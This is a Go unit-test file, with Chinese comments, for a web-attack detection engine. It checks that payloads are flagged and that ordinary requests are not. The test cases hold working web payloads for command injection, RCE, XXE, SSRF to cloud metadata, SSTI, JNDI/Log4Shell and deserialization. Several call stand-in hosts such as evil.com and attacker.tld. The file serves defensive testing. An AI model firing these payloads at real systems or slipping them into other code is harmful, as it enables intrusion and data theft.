package detect

import "testing"

// semEngine 供测试共用的语义引擎（全类默认分值）。
func semEngine() *SemanticEngine {
	return NewSemanticEngine(true, nil)
}

func TestSemanticDetectsAttacks(t *testing.T) {
	cases := []struct {
		cat   string
		where string // query / body / header
		text  string
	}{
		// ---- 命令注入 ----
		{CategoryCmdi, "query", `?ip=127.0.0.1;whoami`},
		{CategoryCmdi, "query", `?host=|cat /etc/passwd`},
		{CategoryCmdi, "query", `?a=1 $(id)`},
		{CategoryCmdi, "query", `?a=1 && uname -a`},
		{CategoryCmdi, "body", `ip=127.0.0.1%0Awhoami`}, // %0a 换行注入（原文匹配）
		{CategoryCmdi, "body", `url=http://x.com/install.sh | sh`},
		{CategoryCmdi, "query", `?f=../../../../etc/passwd;wget http://evil/x`},
		// ---- 远程代码执行 ----
		{CategoryRCE, "body", `cmd=system('cat /etc/passwd')`},
		{CategoryRCE, "body", `c=eval(base64_decode($_POST[z0]))`},
		{CategoryRCE, "body", `p=php://filter/read=convert.base64-encode/resource=index.php`},
		{CategoryRCE, "query", `?exec=__import__('os').popen('id')`},
		{CategoryRCE, "query", `?t=${Runtime.getRuntime().exec("cmd")}`},
		{CategoryRCE, "body", `x=CreateObject("WScript.shell").run("calc")`},
		// ---- XXE ----
		{CategoryXXE, "body", `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>`},
		{CategoryXXE, "body", `<!DOCTYPE r SYSTEM "http://evil.com/evil.dtd"><r/>`},
		{CategoryXXE, "body", `<!ENTITY % remote SYSTEM "http://evil/x.dtd">%remote;`},
		// ---- SSRF ----
		{CategorySSRF, "query", `?url=gopher://127.0.0.1:6379/_INFO`},
		{CategorySSRF, "query", `?u=file:///etc/passwd`},
		{CategorySSRF, "query", `?dest=http://169.254.169.254/latest/meta-data/`},
		{CategorySSRF, "query", `?r=http://metadata.google.internal/computeMetadata/v1/`},
		{CategorySSRF, "body", `target=http://2130706433/admin`},
		// ---- SSTI ----
		{CategorySSTI, "query", `?name={{7*7}}`},
		{CategorySSTI, "body", `tpl={{''.__class__.__mro__[1].__subclasses__()}}`},
		{CategorySSTI, "query", `?x={{config.__class__.__init__.__globals__['os'].popen('id')}}`},
		{CategorySSTI, "body", `t={% import os %}{{os.popen('id')}}`},
		{CategorySSTI, "body", `v=#set($x="")$x.getClass().forName("java.lang.Runtime")`},
		// ---- 表达式注入 ----
		{CategoryExpr, "query", `?j=${jndi:ldap://evil.com/a}`},
		{CategoryExpr, "header", "User-Agent: ${jndi:ldap://attacker.tld/x}"},
		{CategoryExpr, "header", "Referer: ${jndi:${lower:l}${lower:d}ap://x}"},
		{CategoryExpr, "body", `sp=#{T(java.lang.Runtime).getRuntime().exec('calc')}`},
		{CategoryExpr, "query", `?o=%{@java.lang.Runtime@getRuntime().exec('id')}`},
		{CategoryExpr, "body", `s2=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']`},
		// ---- 反序列化 ----
		{CategoryDeser, "body", `data=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==`},
		{CategoryDeser, "body", `payload=aced0005737200116a6176612e7574696c2e486173684d6170`},
		{CategoryDeser, "body", `blob=gASVAAAAAAAAAABунктpOS4=`}, // pickle base64 头
		{CategoryDeser, "body", `cfg=!!python/object/apply:os.system ["id"]`},
		{CategoryDeser, "body", `state=O:8:"Exploit":1:{s:4:"shell";s:3:"id";}`},
		{CategoryDeser, "body", `vs=/wEPDwUKMTY1NDU2Nzg5MWPkr+xShPgABCDEFGHabcdefg+rest==`},
	}

	for _, tc := range cases {
		in := &Input{Method: "POST", Path: "/", Query: "", Body: "", Headers: ""}
		switch tc.where {
		case "query":
			in.Query = tc.text
		case "body":
			in.Body = tc.text
		case "header":
			in.Headers = tc.text
		}
		res := semEngine().Inspect(in)
		found := false
		for _, h := range res.Hits {
			if h.Category == tc.cat {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("未检出 %s 于 %s: %q（hits=%v score=%d）", tc.cat, tc.where, tc.text, res.RuleIDs, res.Score)
		}
		if res.Action == "block" {
			// 单类命中默认分值不应直接越过拦截阈值
			t.Errorf("单类命中不应 block: %s (%q) score=%d", tc.cat, tc.text, res.Score)
		}
	}
}

func TestSemanticIgnoresBenign(t *testing.T) {
	benign := []struct {
		where string
		text  string
	}{
		// 常规查询：&id= / ;sort= 一类的高频组合绝不能误判
		{"query", `page=3&id=42&q=coffee+machine&sort=price`},
		{"query", `?ids=1,2,3&type=doc&page=2`},
		{"query", `?cat=5&list=electronics`},
		// 正文里的普通技术讨论（元字符与命令词分离出现）
		{"body", `to install, run curl -O https://example.com/install.sh then bash install.sh`},
		{"body", `the command is: uname -a shows kernel version`},
		{"body", `use jQuery: $('#item').show()`},
		{"body", `compare a && b in javascript means logical and`},
		{"body", `see docs at file:///dev/null for more`}, // 无路径的 file:// 不判
		// JSON API 正常负载
		{"body", `{"name":"张三","phone":"13800138000","tags":["a","b"],"count":42}`},
		{"body", "{\"markdown\":\"## heading\\n- item\\n\\\"bash fence\\\"\\necho hi\\n\"}"},
		// 正常业务头
		{"header", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"},
		{"header", "Accept: text/html,application/xhtml+xml;q=0.9"},
		// 模板引擎正常输出（不含运算/属性链）
		{"body", `hello {{username}}, welcome back!`},
		{"body", `{% for item in items %}{{item.name}}{% endfor %}`},
		// jndi 字样但非注入结构
		{"body", `we migrated from jndi datasource to hikari pool`},
	}
	for _, tc := range benign {
		in := &Input{Method: "POST", Path: "/", Query: "", Body: "", Headers: ""}
		switch tc.where {
		case "query":
			in.Query = tc.text
		case "body":
			in.Body = tc.text
		case "header":
			in.Headers = tc.text
		}
		res := semEngine().Inspect(in)
		if res.Score > 0 {
			t.Errorf("误报: %s %q → %v", tc.where, tc.text, res.Hits)
		}
	}
}

func TestSemanticDisabled(t *testing.T) {
	e := NewSemanticEngine(false, nil)
	res := e.Inspect(&Input{Query: `;whoami`, Body: ``})
	if res.Score != 0 || len(res.Hits) != 0 {
		t.Fatalf("禁用状态不应命中: %+v", res)
	}
}

func TestSemanticScoreOverride(t *testing.T) {
	e := NewSemanticEngine(true, map[string]int{CategoryCmdi: 70})
	res := e.Inspect(&Input{Query: `;whoami`})
	if res.Score != 70 {
		t.Fatalf("分值覆盖失败: got %d want 70", res.Score)
	}
}

func TestSemanticDedupPerCategory(t *testing.T) {
	// 同一类别在 query 与 body 同时命中只记一次
	e := semEngine()
	res := e.Inspect(&Input{Query: `;whoami`, Body: `x=|cat /etc/passwd`})
	n := 0
	for _, h := range res.Hits {
		if h.Category == CategoryCmdi {
			n++
		}
	}
	if n != 1 {
		t.Fatalf("同类跨部位应去重: got %d hits", n)
	}
}

func TestSemanticDecodedVariantsScanned(t *testing.T) {
	// base64(";whoami") 解码变体应命中
	in := &Input{Query: `q=O3dob2FtaQ%3D%3D`, DecodedQuery: []string{";whoami"}}
	res := semEngine().Inspect(in)
	if res.Score == 0 {
		t.Fatal("解码变体未被扫描")
	}
}
